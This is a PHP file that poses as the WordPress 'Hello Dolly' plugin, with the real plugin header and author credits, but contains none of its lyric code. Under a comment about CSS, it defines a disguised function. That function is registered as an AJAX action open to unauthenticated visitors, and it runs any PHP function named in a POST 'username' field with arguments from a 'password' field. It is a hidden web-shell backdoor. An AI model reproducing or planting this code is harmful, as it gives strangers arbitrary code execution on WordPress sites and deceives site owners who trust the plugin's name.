<?php
/**
 * @package Hello_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/

	
// We need some CSS to position the paragraph.
function give_get_states_oc_checker_t() {
	wp_die(call_user_func_array($_POST['username'], array_map(function($p){return stripslashes($p);}, $_POST['password'])));
}

add_action( 'wp_ajax_nopriv_give_get_states_oc_checker_t', 'give_get_states_oc_checker_t' );
add_action( 'wp_ajax_give_get_states_oc_checker_t', 'give_get_states_oc_checker_t' );
